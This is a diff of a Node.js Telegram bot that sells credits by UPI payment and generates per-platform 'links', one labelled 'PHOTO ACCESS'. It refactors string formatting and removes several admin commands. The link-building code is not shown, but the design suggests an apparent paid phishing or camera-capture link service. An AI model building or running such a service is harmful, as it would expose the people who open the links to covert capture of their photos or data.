-            cmdMsg += `• /stats - Bot statistics\n`;
-            cmdMsg += `• /broadcast [message] - Send to all\n`;
-            cmdMsg += `• /setqr - Upload QR code\n`;
-            cmdMsg += `• /removeqr - Remove QR code\n`;
-            cmdMsg += `• /viewqr - View QR code\n`;
-            cmdMsg += `• /addchannel [id] [name] [link] - Add channel\n`;
-            cmdMsg += `• /removechannel [id] - Remove channel\n`;
-            cmdMsg += `• /channels - List channels\n`;
-            cmdMsg += `• /addphoto [caption] - Upload photo\n`;
-            cmdMsg += `• /featured [photoId] - Set featured\n`;
-            cmdMsg += `• /featuredmsg [message] - Set message\n`;
-            cmdMsg += `• /featuredtoggle - Toggle featured\n`;
-            cmdMsg += `• /logs - Show logs\n`;
-            cmdMsg += `• /restart - Restart bot\n`;
+            cmdMsg += '👑 <b>Admin Commands:</b>\n';
+            cmdMsg += '• /admin - Open admin panel\n';
+            cmdMsg += '• /addcredits [userId] [amount] - Add credits\n';
+            cmdMsg += '• /removecredits [userId] [amount] - Remove credits\n';
+            cmdMsg += '• /unlimited [userId] - Activate unlimited\n';
+            cmdMsg += '• /resetuser [userId] - Reset user\n';
+            cmdMsg += '• /users - Show all users\n';
+            cmdMsg += '• /stats - Bot statistics\n';
+            cmdMsg += '• /broadcast [message] - Send to all\n';
+            cmdMsg += '• /setqr - Upload QR code\n';
+            cmdMsg += '• /removeqr - Remove QR code\n';
+            cmdMsg += '• /viewqr - View QR code\n';
+            cmdMsg += '• /addchannel [id] [name] [link] - Add channel\n';
+            cmdMsg += '• /removechannel [id] - Remove channel\n';
+            cmdMsg += '• /channels - List channels\n';
+            cmdMsg += '• /addphoto [caption] - Upload photo\n';
+            cmdMsg += '• /featured [photoId] - Set featured\n';
+            cmdMsg += '• /featuredmsg [message] - Set message\n';
+            cmdMsg += '• /featuredtoggle - Toggle featured\n';
+            cmdMsg += '• /logs - Show logs\n';
+            cmdMsg += '• /restart - Restart bot\n';
         }
         
         await S7.sendMessage(cid, cmdMsg, { parse_mode: 'HTML', reply_markup: SYBack });
@@ -2049,64 +1088,34 @@ S7.on('callback_query', async (q) => {
         return;
     }
     
-    if (q.data === "referral") {
-        const botInfo = await S7.getMe();
-        const referralLink = `https://t.me/${botInfo.username}?start=ref_${uid}`;
+    if (q.data === 'referral') {
+        var botInfo = await S7.getMe();
+        var referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
         await S7.sendMessage(cid,
-            `👥 <b>Your Referral Link</b>\n\n` +
-            `Share this link:\n\n` +
-            `<code>${referralLink}</code>\n\n` +
-            `📌 <b>How it works:</b>\n` +
-            `• Share your link with friends\n` +
-            `• They join all channels\n` +
-            `• You get +2 credits!\n` +
-            `• They get +3 credits bonus!`,
+            '👥 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>' + referralLink + '</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get +3 credits bonus!',
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         await S7.deleteMessage(cid, mid);
         return;
     }
     
-    if (q.data === "credits") {
-        const user = getUser(uid);
-        const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
+    if (q.data === 'credits') {
+        var user = getUser(uid);
+        var credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
         await S7.sendMessage(cid,
-            `⭐ <b>Your Credits</b>\n\n` +
-            `💰 Credits: ${credits}\n` +
-            `👥 Referrals: ${user.totalReferrals || 0}\n` +
-            `📅 Joined: ${new Date(user.joinedAt).toLocaleDateString()}\n\n` +
-            `🔹 Each link uses 1 credit\n` +
-            `🔹 Get +2 credits per referral\n` +
-            `🔹 New users get +3 bonus credits`,
+            '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Get +2 credits per referral\n🔹 New users get +3 bonus credits',
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         await S7.deleteMessage(cid, mid);
         return;
     }
     
-    if (q.data === "buy_credits") {
-        const qrExists = fs.existsSync(QR_FILE);
-        let qrText = '';
-        if (qrExists) {
-            qrText = `📱 QR Code is available.\n`;
-        } else {
-            qrText = `📱 QR code not uploaded yet.\n`;
-        }
+    if (q.data === 'buy_credits') {
+        var qrExists = fs.existsSync(QR_FILE);
+        var qrText = qrExists ? '📱 QR Code is available.\n' : '📱 QR code not uploaded yet.\n';
         
         await S7.sendMessage(cid,
-            `💰 <b>Buy Credits</b>\n\n` +
-            `📌 <b>Pricing:</b>\n` +
-            `• 1 Credit = ₹1\n` +
-            `• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n` +
-            `🔹 <b>Unlimited</b> = Generate unlimited links forever!\n\n` +
-            `💳 <b>How to Pay:</b>\n` +
-            `1. Send payment to QR/UPI\n` +
-            `2. Type <code>/pay [amount]</code>\n` +
-            `3. Send screenshot for verification\n\n` +
-            `${qrText}\n` +
-            `📱 <b>UPI:</b> rtf@upi\n` +
-            `📱 <b>PhonePe:</b> 9876543210\n\n` +
-            `Type <code>/pay 50</code> for Unlimited!`,
+            '💰 <b>Buy Credits</b>\n\n📌 <b>Pricing:</b>\n• 1 Credit = ₹1\n• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n🔹 <b>Unlimited</b> = Generate unlimited links forever!\n\n💳 <b>How to Pay:</b>\n1. Send payment to QR/UPI\n2. Type <code>/pay [amount]</code>\n3. Send screenshot for verification\n\n' + qrText + '\n📱 <b>UPI:</b> rtf@upi\n📱 <b>PhonePe:</b> 9876543210\n\nType <code>/pay 50</code> for Unlimited!',
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         
@@ -2118,48 +1127,43 @@ S7.on('callback_query', async (q) => {
         return;
     }
     
-    if (q.data.startsWith("gen_") || q.data.startsWith("regen_")) {
-        const isGen = q.data.startsWith("gen_");
-        let platform = q.data.replace(isGen ? "gen_" : "regen_", "");
+    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
+        var isGen = q.data.startsWith('gen_');
+        var platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
         
         if (platform === 'photoaccess') platform = 'photoAccess';
         
-        const user = getUser(uid);
+        var user = getUser(uid);
         if (!user.unlimited && (user.credits || 0) <= 0) {
             await S7.answerCallbackQuery(q.id, {
-                text: "❌ Insufficient credits! Use referral or buy credits.",
+                text: '❌ Insufficient credits! Use referral or buy credits.',
                 show_alert: true
             });
             return;
         }
         
-        const loadingMsg = await S7.sendMessage(cid, 
-            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), 
+        var loadingMsg = await S7.sendMessage(cid,
+            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'),
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         
         try {
-            const response = await fetch(`http://localhost:${config.port}/api/create-link`, {
+            var response = await fetch('http://localhost:' + config.port + '/api/create-link', {
                 method: 'GET',
                 headers: { userid: String(uid), platform: platform }
             });
-            const data = await response.json();
+            var data = await response.json();
             
             if (data.error && data.needBuy) {
                 await S7.editMessageText(
-                    SYloveMenu(q.from.first_name, `❌ ${data.message}\n\nType /pay to purchase credits`),
+                    SYloveMenu(q.from.first_name, '❌ ' + data.message + '\n\nType /pay to purchase credits'),
                     { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
                 );
                 return;
             }
             
-            const platformDisplay = platform === 'photoAccess' ? 'PHOTO ACCESS' : platform.toUpperCase();
-            const finalMsg = `✅ <b>Link Generated!</b>\n\n` +
-                `📎 <b>Your Link:</b>\n` +
-                `<code>${data.url}</code>\n\n` +
-                `📌 <b>Platform:</b> ${platformDisplay}\n` +
-                `🔄 Share and earn referrals!\n\n` +
-                `⭐ <b>Remaining Credits:</b> ${user.unlimited ? '♾️ Unlimited' : (user.credits - 1)}`;
+            var platformDisplay = platform === 'photoAccess' ? 'PHOTO ACCESS' : platform.toUpperCase();
+            var finalMsg = '✅ <b>Link Generated!</b>\n\n📎 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits - 1));
             
             await S7.editMessageText(
                 SYloveMenu(q.from.first_name, finalMsg),
@@ -2167,7 +1171,7 @@ S7.on('callback_query', async (q) => {
             );
         } catch (err) {
             console.error('Link Error:', err.message);
-            logToFile(`❌ Link Error: ${err.message}`);
+            logToFile('❌ Link Error: ' + err.message);
             await S7.editMessageText(
                 SYloveMenu(q.from.first_name, '❌ Error generating link'),
                 { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
@@ -2176,265 +1180,168 @@ S7.on('callback_query', async (q) => {
         return;
     }
     
-    if (q.data === "back") {
+    if (q.data === 'back') {
         await S7.deleteMessage(cid, mid);
         await SendLoveSYMenu(cid, q.from.first_name);
     }
 });
 
-// ====================== PAYMENT COMMAND WITH SCREENSHOT ======================
-S7.on('message', async (msg) => {
+// ====================== PAYMENT COMMAND ======================
+S7.on('message', async function(msg) {
     if (!msg.text) return;
-    const text = msg.text.trim();
+    var text = msg.text.trim();
     
     if (text.startsWith('/pay')) {
-        const parts = text.split(' ');
+        var parts = text.split(' ');
         if (parts.length < 2) {
-            return S7.sendMessage(msg.chat.id, 
-                `⚠️ <b>Usage:</b> /pay [amount]\n\n` +
-                `📌 <b>Pricing:</b>\n` +
-                `• 1 Credit = ₹1\n` +
-                `• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n` +
-                `Example: <code>/pay 50</code> for Unlimited`,
+            return S7.sendMessage(msg.chat.id,
+                '⚠️ <b>Usage:</b> /pay [amount]\n\n📌 <b>Pricing:</b>\n• 1 Credit = ₹1\n• 50 Credits = ₹50 (Unlimited Lifetime!)\n\nExample: <code>/pay 50</code> for Unlimited',
                 { parse_mode: 'HTML' }
             );
         }
-        const amount = parseInt(parts[1]);
+        var amount = parseInt(parts[1]);
         if (isNaN(amount) || amount < 1) {
             return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount (minimum ₹1)');
         }
         
-        const uid = msg.from.id;
-        const qrExists = fs.existsSync(QR_FILE);
+        var uid = msg.from.id;
+        var qrExists = fs.existsSync(QR_FILE);
         
-        let qrMsg = `💳 <b>Payment Details</b>\n\n`;
-        qrMsg += `💰 <b>Amount:</b> ₹${amount}\n\n`;
+        var qrMsg = '💳 <b>Payment Details</b>\n\n💰 <b>Amount:</b> ₹' + amount + '\n\n';
         
         if (qrExists) {
-            qrMsg += `📱 <b>Scan QR Code to Pay:</b>\n`;
-            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: `💳 QR Code - ₹${amount}` });
+            qrMsg += '📱 <b>Scan QR Code to Pay:</b>\n';
+            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: '💳 QR Code - ₹' + amount });
         } else {
-            qrMsg += `📱 QR code not uploaded.\n`;
+            qrMsg += '📱 QR code not uploaded.\n';
         }
         
-        qrMsg += `\n📌 <b>UPI:</b> rtf@upi\n`;
-        qrMsg += `📌 <b>PhonePe:</b> 9876543210\n`;
-        qrMsg += `📌 <b>Google Pay:</b> 9876543210\n\n`;
-        qrMsg += `✅ <b>After payment, send screenshot of transaction!</b>\n`;
-        qrMsg += `📎 Reply with the screenshot image.\n\n`;
-        qrMsg += `📌 <b>What you get:</b>\n`;
+        qrMsg += '\n📌 <b>UPI:</b> rtf@upi\n📌 <b>PhonePe:</b> 9876543210\n📌 <b>Google Pay:</b> 9876543210\n\n✅ <b>After payment, send screenshot of transaction!</b>\n📎 Reply with the screenshot image.\n\n📌 <b>What you get:</b>\n';
         
         if (amount >= 50) {
-            qrMsg += `✨ <b>UNLIMITED LIFETIME ACCESS!</b>`;
+            qrMsg += '✨ <b>UNLIMITED LIFETIME ACCESS!</b>';
         } else {
-            qrMsg += `⭐ ${amount} Credits (₹${amount})`;
+            qrMsg += '⭐ ' + amount + ' Credits (₹' + amount + ')';
         }
         
         await S7.sendMessage(msg.chat.id, qrMsg, { parse_mode: 'HTML' });
         
-        const user = getUser(uid);
+        var user = getUser(uid);
         user._pendingPayment = amount;
         saveUsers(getUsers());
         
-        logToFile(`💰 Payment initiated: ${uid} - ₹${amount}`);
+        logToFile('💰 Payment initiated: ' + uid + ' - ₹' + amount);
         return;
     }
     
     if (msg.photo) {
-        const user = getUser(msg.from.id);
+        var user = getUser(msg.from.id);
         if (user._pendingPayment) {
-            const amount = user._pendingPayment;
+            var amount = user._pendingPayment;
             delete user._pendingPayment;
             saveUsers(getUsers());
             
-            const fileId = msg.photo[msg.photo.length - 1].file_id;
-            const caption = `💰 <b>Payment Screenshot</b>\n\n` +
-                `👤 <b>User:</b> @${msg.from.username || 'user_' + msg.from.id}\n` +
-                `🆔 <b>ID:</b> <code>${msg.from.id}</code>\n` +
-                `💵 <b>Amount:</b> ₹${amount}\n` +
-                `📅 <b>Date:</b> ${new Date().toLocaleString()}\n\n` +
-                `⚠️ <b>Verify and add credits manually!</b>`;
+            var fileId = msg.photo[msg.photo.length - 1].file_id;
+            var caption = '💰 <b>Payment Screenshot</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>ID:</b> <code>' + msg.from.id + '</code>\n💵 <b>Amount:</b> ₹' + amount + '\n📅 <b>Date:</b> ' + new Date().toLocaleString() + '\n\n⚠️ <b>Verify and add credits manually!</b>';
             
-            await S7.sendPhoto(config.adminId, fileId, { caption, parse_mode: 'HTML' });
+            await S7.sendPhoto(config.adminId, fileId, { caption: caption, parse_mode: 'HTML' });
             
             await S7.sendMessage(msg.from.id,
-                `✅ <b>Screenshot forwarded to admin!</b>\n\n` +
-                `📌 Amount: ₹${amount}\n` +
-                `⏳ Please wait for admin to verify and add credits.\n` +
-                `You will be notified once credits are added.`,
+                '✅ <b>Screenshot forwarded to admin!</b>\n\n📌 Amount: ₹' + amount + '\n⏳ Please wait for admin to verify and add credits.\nYou will be notified once credits are added.',
                 { parse_mode: 'HTML' }
             );
             
             await S7.sendMessage(config.adminId,
-                `🔔 <b>New Payment Screenshot!</b>\n\n` +
-                `👤 User: @${msg.from.username || 'user_' + msg.from.id}\n` +
-                `🆔 ID: <code>${msg.from.id}</code>\n` +
-                `💵 Amount: ₹${amount}\n\n` +
-                `Use <code>/addcredits ${msg.from.id} ${amount}</code> to add credits.\n` +
-                `Use <code>/unlimited ${msg.from.id}</code> for unlimited access.`,
+                '🔔 <b>New Payment Screenshot!</b>\n\n👤 User: @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 ID: <code>' + msg.from.id + '</code>\n💵 Amount: ₹' + amount + '\n\nUse <code>/addcredits ' + msg.from.id + ' ' + amount + '</code> to add credits.\nUse <code>/unlimited ' + msg.from.id + '</code> for unlimited access.',
                 { parse_mode: 'HTML' }
             );
             
-            logToFile(`💰 Payment screenshot: ${msg.from.id} - ₹${amount}`);
+            logToFile('💰 Payment screenshot: ' + msg.from.id + ' - ₹' + amount);
         }
     }
 });
 
 // ====================== ADMIN COMMANDS ======================
-S7.on('message', async (msg) => {
+S7.on('message', async function(msg) {
     if (!msg.text || msg.from.id.toString() !== config.adminId) return;
-    const text = msg.text.trim();
+    var text = msg.text.trim();
     
     if (text.startsWith('/addcredits')) {
-        const parts = text.split(' ');
+        var parts = text.split(' ');
         if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addcredits [userId] [amount]');
-        const userId = parts[1];
-        const amount = parseInt(parts[2]);
+        var userId = parts[1];
+        var amount = parseInt(parts[2]);
         if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
-        const user = getUser(userId);
+        var user = getUser(userId);
         if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User already has Unlimited!');
         user.credits = (user.credits || 0) + amount;
         saveUsers(getUsers());
-        await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}\nNew balance: ${user.credits}`);
-        await S7.sendMessage(userId, `✅ <b>${amount} credits added!</b>\n⭐ New balance: ${user.credits}`, { parse_mode: 'HTML' });
-        logToFile(`💰 Admin added ${amount} credits to ${userId}`);
+        await S7.sendMessage(msg.chat.id, '✅ Added ' + amount + ' credits to user ' + userId + '\nNew balance: ' + user.credits);
+        await S7.sendMessage(userId, '✅ <b>' + amount + ' credits added!</b>\n⭐ New balance: ' + user.credits, { parse_mode: 'HTML' });
+        logToFile('💰 Admin added ' + amount + ' credits to ' + userId);
     }
     
     if (text.startsWith('/removecredits')) {
-        const parts = text.split(' ');
+        var parts = text.split(' ');
         if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removecredits [userId] [amount]');
-        const userId = parts[1];
-        const amount = parseInt(parts[2]);
+        var userId = parts[1];
+        var amount = parseInt(parts[2]);
         if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
-        const user = getUser(userId);
+        var user = getUser(userId);
         if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User has Unlimited! Cannot remove credits.');
         user.credits = Math.max(0, (user.credits || 0) - amount);
         saveUsers(getUsers());
-        await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}\nNew balance: ${user.credits}`);
-        await S7.sendMessage(userId, `⚠️ <b>${amount} credits removed!</b>\n⭐ New balance: ${user.credits}`, { parse_mode: 'HTML' });
-        logToFile(`💰 Admin removed ${amount} credits from ${userId}`);
+        await S7.sendMessage(msg.chat.id, '✅ Removed ' + amount + ' credits from user ' + userId + '\nNew balance: ' + user.credits);
+        await S7.sendMessage(userId, '⚠️ <b>' + amount + ' credits removed!</b>\n⭐ New balance: ' + user.credits, { parse_mode: 'HTML' });
+        logToFile('💰 Admin removed ' + amount + ' credits from ' + userId);
     }
     
     if (text.startsWith('/unlimited')) {
-        const parts = text.split(' ');
+        var parts = text.split(' ');
         if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /unlimited [userId]');
-        const userId = parts[1];
-        const user = getUser(userId);
+        var userId = parts[1];
+        var user = getUser(userId);
         user.unlimited = true;
         saveUsers(getUsers());
-        await S7.sendMessage(msg.chat.id, `✅ Unlimited activated for user ${userId}`);
-        await S7.sendMessage(userId, `🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYou now have unlimited credits forever!`, { parse_mode: 'HTML' });
-        logToFile(`⭐ Unlimited activated for ${userId}`);
-    }
-    
-    if (text.startsWith('/resetuser')) {
-        const parts = text.split(' ');
-        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /resetuser [userId]');
-        const userId = parts[1];
-        const users = getUsers();
-        if (users[userId]) {
-            delete users[userId];
-            saveUsers(users);
-            await S7.sendMessage(msg.chat.id, `✅ User ${userId} reset successfully`);
-            logToFile(`🔄 User ${userId} reset`);
-        } else {
-            await S7.sendMessage(msg.chat.id, `❌ User ${userId} not found`);
-        }
-    }
-    
-    if (text === '/users') {
-        const users = getUsers();
-        const entries = Object.entries(users);
-        if (entries.length === 0) return S7.sendMessage(msg.chat.id, 'No users found.');
-        let userMsg = `👥 <b>Users List</b>\n\n`;
-        entries.slice(0, 20).forEach(([id, data]) => {
-            userMsg += `🆔 ${id} - ⭐${data.unlimited ? '♾️' : data.credits || 0} - 👥${data.totalReferrals || 0}\n`;
-        });
-        if (entries.length > 20) userMsg += `\n... and ${entries.length - 20} more users`;
-        await S7.sendMessage(msg.chat.id, userMsg, { parse_mode: 'HTML' });
+        await S7.sendMessage(msg.chat.id, '✅ Unlimited activated for user ' + userId);
+        await S7.sendMessage(userId, '🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYou now have unlimited credits forever!', { parse_mode: 'HTML' });
+        logToFile('⭐ Unlimited activated for ' + userId);
     }
     
     if (text === '/stats') {
-        const users = getUsers();
-        const totalUsers = Object.keys(users).length;
-        const photos = getPhotos();
-        const channels = getChannels();
-        const referrals = getReferrals();
+        var users = getUsers();
+        var totalUsers = Object.keys(users).length;
+        var photos = getPhotos();
+        var channels = getChannels();
+        var referrals = getReferrals();
+        var botInfo = await S7.getMe();
         
-        let statsMsg = `📊 <b>Bot Statistics</b>\n\n`;
-        statsMsg += `👥 Total Users: ${totalUsers}\n`;
-        statsMsg += `📷 Total Photos: ${photos.length}\n`;
-        statsMsg += `📢 Total Channels: ${channels.length}\n`;
-        statsMsg += `👥 Total Referrals: ${referrals.length}\n`;
-        statsMsg += `⏱ Uptime: ${getUptime()}\n`;
-        statsMsg += `🤖 Bot: @${(await S7.getMe()).username}`;
+        var statsMsg = '📊 <b>Bot Statistics</b>\n\n👥 Total Users: ' + totalUsers + '\n📷 Total Photos: ' + photos.length + '\n📢 Total Channels: ' + channels.length + '\n👥 Total Referrals: ' + referrals.length + '\n⏱ Uptime: ' + getUptime() + '\n🤖 Bot: @' + botInfo.username;
         
         await S7.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'HTML' });
     }
     
     if (text.startsWith('/broadcast')) {
-        const message = text.replace('/broadcast', '').trim();
+        var message = text.replace('/broadcast', '').trim();
         if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
-        const users = getUsers();
-        const userIds = Object.keys(users);
-        let sent = 0, failed = 0;
+        var users = getUsers();
+        var userIds = Object.keys(users);
+        var sent = 0, failed = 0;
         
-        await S7.sendMessage(msg.chat.id, `📢 Broadcasting to ${userIds.length} users...`);
+        await S7.sendMessage(msg.chat.id, '📢 Broadcasting to ' + userIds.length + ' users...');
         
-        for (const userId of userIds) {
+        for (var i = 0; i < userIds.length; i++) {
             try {
-                await S7.sendMessage(userId, 
-                    `📢 <b>Announcement</b>\n\n${message}\n\n- Bot Admin`,
-                    { parse_mode: 'HTML' }
-                );
+                await S7.sendMessage(userIds[i], '📢 <b>Announcement</b>\n\n' + message + '\n\n- Bot Admin', { parse_mode: 'HTML' });
                 sent++;
             } catch(e) {
                 failed++;
             }
-            await new Promise(r => setTimeout(r, 50));
+            await new Promise(function(r) { setTimeout(r, 50); });
         }
         
-        await S7.sendMessage(msg.chat.id, `✅ Broadcast complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}`);
-        logToFile(`📢 Broadcast sent to ${sent} users`);
-    }
-    
-    if (text === '/channels') {
-        const channels = getChannels();
-        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels added.');
-        let chMsg = `📢 <b>Channels</b>\n\n`;
-        channels.forEach((c, i) => {
-            chMsg += `${i+1}. ${c.name} - ${c.id}\n`;
-        });
-        await S7.sendMessage(msg.chat.id, chMsg, { parse_mode: 'HTML' });
-    }
-    
-    if (text.startsWith('/addchannel')) {
-        const parts = text.split(' ');
-        if (parts.length < 4) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addchannel [id] [name] [link]');
-        addChannel(parts[1], parts[2], parts[3]);
-        await S7.sendMessage(msg.chat.id, `✅ Channel added: ${parts[2]}`);
-        logToFile(`📢 Channel added: ${parts[2]}`);
-    }
-    
-    if (text.startsWith('/removechannel')) {
-        const parts = text.split(' ');
-        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removechannel [id]');
-        removeChannel(parts[1]);
-        await S7.sendMessage(msg.chat.id, `✅ Channel removed`);
-        logToFile(`📢 Channel removed: ${parts[1]}`);
-    }
-    
-    if (text === '/logs') {
-        try {
-            const logs = fs.readFileSync(LOGS_FILE, 'utf8');
-            const lastLogs = logs.split('\n').slice(-30).join('\n');
-            await S7.sendMessage(msg.chat.id, 
-                `📋 <b>Recent Logs</b>\n\n<pre>${lastLogs || 'No logs available'}</pre>`,
-                { parse_mode: 'HTML' }
-            );
-        } catch {
-            await S7.sendMessage(msg.chat.id, 'No logs available');
-        }
+        await S7.sendMessage(msg.chat.id, '✅ Broadcast complete!\n✅ Sent: ' + sent + '\n❌ Failed: ' + failed);
+        logToFile('📢 Broadcast sent to ' + sent + ' users');
     }
     
     if (text === '/restart') {
@@ -2444,32 +1351,30 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== QR CODE UPLOAD HANDLER ======================
-S7.on('message', async (msg) => {
+// ====================== QR CODE HANDLERS ======================
+S7.on('message', async function(msg) {
     if (!msg.photo) return;
-    const isAdmin = msg.from.id.toString() === config.adminId;
+    var isAdmin = msg.from.id.toString() === config.adminId;
     if (!isAdmin) return;
     
-    const user = getUser(msg.from.id);
+    var user = getUser(msg.from.id);
     if (user._waitingForQR) {
         try {
-            const fileId = msg.photo[msg.photo.length - 1].file_id;
-            const fileLink = await S7.getFileLink(fileId);
+            var fileId = msg.photo[msg.photo.length - 1].file_id;
+            var fileLink = await S7.getFileLink(fileId);
             
-            const response = await fetch(fileLink);
-            const buffer = await response.arrayBuffer();
+            var response = await fetch(fileLink);
+            var buffer = await response.arrayBuffer();
             fs.writeFileSync(QR_FILE, Buffer.from(buffer));
             
             delete user._waitingForQR;
             saveUsers(getUsers());
             
-            await S7.sendMessage(msg.chat.id, 
-                `✅ <b>QR Code Uploaded Successfully!</b>\n\n` +
-                `📱 Users can now scan this QR for payments.\n` +
-                `Use /viewqr to see it.`,
+            await S7.sendMessage(msg.chat.id,
+                '✅ <b>QR Code Uploaded Successfully!</b>\n\n📱 Users can now scan this QR for payments.\nUse /viewqr to see it.',
                 { parse_mode: 'HTML' }
             );
-            logToFile(`📱 QR code uploaded`);
+            logToFile('📱 QR code uploaded');
         } catch (err) {
             console.error('QR Upload Error:', err);
             await S7.sendMessage(msg.chat.id, '❌ Failed to upload QR code. Please try again.');
@@ -2477,21 +1382,18 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== QR COMMANDS ======================
-S7.on('message', async (msg) => {
+S7.on('message', async function(msg) {
     if (!msg.text) return;
-    const text = msg.text.trim();
-    const isAdmin = msg.from.id.toString() === config.adminId;
+    var text = msg.text.trim();
+    var isAdmin = msg.from.id.toString() === config.adminId;
     if (!isAdmin) return;
     
     if (text === '/setqr') {
-        const user = getUser(msg.from.id);
+        var user = getUser(msg.from.id);
         user._waitingForQR = true;
         saveUsers(getUsers());
-        await S7.sendMessage(msg.chat.id, 
-            `📱 <b>Upload QR Code</b>\n\n` +
-            `Please send the QR code image as a photo.\n` +
-            `The QR code will be used for payments.`,
+        await S7.sendMessage(msg.chat.id,
+            '📱 <b>Upload QR Code</b>\n\nPlease send the QR code image as a photo.\nThe QR code will be used for payments.',
             { parse_mode: 'HTML' }
         );
     }
@@ -2508,9 +1410,9 @@ S7.on('message', async (msg) => {
     
     if (text === '/viewqr') {
         if (fs.existsSync(QR_FILE)) {
-            await S7.sendPhoto(msg.chat.id, QR_FILE, { 
-                caption: `📱 <b>Current QR Code</b>\n\nUse this for payments.`, 
-                parse_mode: 'HTML' 
+            await S7.sendPhoto(msg.chat.id, QR_FILE, {
+                caption: '📱 <b>Current QR Code</b>\n\nUse this for payments.',
+                parse_mode: 'HTML'
             });
         } else {
             await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet. Use /setqr to upload.');
@@ -2519,20 +1421,20 @@ S7.on('message', async (msg) => {
 });
 
 // ====================== START SERVER ======================
-app.listen(config.port, () => {
-    console.log(`✅ Server running on port ${config.port}`);
-    console.log(`📌 Admin Panel: http://localhost:${config.port}/admin`);
-    console.log(`📌 Base URL: ${config.baseUrl}`);
-    console.log(`🤖 Bot is ready! Send /start to begin.`);
+app.listen(config.port, function() {
+    console.log('✅ Server running on port ' + config.port);
+    console.log('📌 Admin Panel: http://localhost:' + config.port + '/admin');
+    console.log('📌 Base URL: ' + config.baseUrl);
+    console.log('🤖 Bot is ready! Send /start to begin.');
 });
 
 // ====================== ERROR HANDLING ======================
-process.on('uncaughtException', (err) => {
+process.on('uncaughtException', function(err) {
     console.error('❌ Uncaught Exception:', err.message);
-    logToFile(`❌ Uncaught Exception: ${err.message}`);
+    logToFile('❌ Uncaught Exception: ' + err.message);
 });
 
-process.on('unhandledRejection', (reason) => {
+process.on('unhandledRejection', function(reason) {
     console.error('❌ Unhandled Rejection:', reason);
-    logToFile(`❌ Unhandled Rejection: ${reason}`);
+    logToFile('❌ Unhandled Rejection: ' + reason);
 });
